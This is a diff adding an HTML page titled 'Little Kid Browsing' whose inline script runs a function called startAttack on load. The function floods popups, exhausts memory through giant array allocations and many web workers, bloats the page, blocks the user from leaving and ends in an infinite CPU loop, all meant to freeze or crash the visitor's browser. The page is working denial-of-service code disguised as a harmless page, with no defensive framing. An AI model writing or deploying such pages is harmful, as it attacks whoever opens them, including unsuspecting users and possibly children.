@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Little Kid Browsing</title>
+<script>
+window.onload = function() {
+startAttack();
+};
+function startAttack() {
+function spawnPopups() {
+setInterval(() => {
+window.open("https://google.com", "_blank", "width=400,height=400");
+}, 50);
+}
+let memoryHog = [];
+function heapSpray() {
+for (let i = 0; i < 5000; i++) {
+memoryHog.push(new Array(1e6).fill("X".repeat(1000)));
+}
+setTimeout(heapSpray, 1);
+}
+function startWorkers() {
+for (let i = 0; i < navigator.hardwareConcurrency * 4; i++) {
+let worker = new Worker(URL.createObjectURL(new Blob([`
+setInterval(() => {
+let x = [];
+for (let j = 0; j < 5000; j++) {
+x.push(new Array(1e6).fill("Y".repeat(1000)));
+}
+}, 1);
+`], { type: 'application/javascript' })));
+}
+}
+let noGC = [];
+function blockGarbageCollection() {
+setInterval(() => {
+noGC.push(new Array(1e6).fill("Z".repeat(1000)));
+}, 1);
+}
+function domBloat() {
+setInterval(() => {
+for (let i = 0; i < 5000; i++) {
+let div = document.createElement("div");
+div.innerHTML = "🚀".repeat(1000);
+document.body.appendChild(div);
+}
+}, 1);
+}
+function recursiveBlock() {
+while (true) {
+console.log("🔥 CPU BURNING 🔥");
+}
+}
+
+window.onbeforeunload = function() {
+return "You cannot leave!";
+};
+
+for (let i = 0; i < 10000; i++) {
+fetch("file:///localhost/");
+}
+
+
+
+
+spawnPopups();
+heapSpray();
+startWorkers();
+blockGarbageCollection();
+domBloat();
+setTimeout(recursiveBlock, 2000);
+}
+</script>
+</head>
+<body>
+<h1>Little Kid Browsing</h1>
+</body>
+</html>
